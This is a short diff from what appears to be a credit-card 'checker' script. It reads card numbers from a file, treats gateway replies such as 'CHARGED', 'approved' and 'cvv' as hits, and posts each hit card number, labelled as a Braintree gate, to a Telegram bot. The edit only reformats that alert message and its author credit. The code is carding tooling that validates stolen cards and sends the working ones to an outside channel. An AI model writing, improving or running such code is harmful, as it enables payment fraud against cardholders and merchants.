@@ -356,7 +356,7 @@ for card in file.readlines():
 	if 'funds' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
 		print(F+f'[{line}] '+card+' ➜ '+result+' ✅ ')
 		print(Z+o)
-		msg = f"<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ <code>{card}</code>\n[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {result}\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='t.me/Q_2_M'>𝗧𝗔𝗞𝗘𝗠𝗜𝗖𝗛𝗜</a></b>"
+		msg = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ {card}\n[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {result}\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 𝗧𝗔𝗞𝗘𝗠𝗜𝗖𝗛𝗜 ~ @Q_2_M"
 		url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}"
 		i = requests.post(url)
 	else:
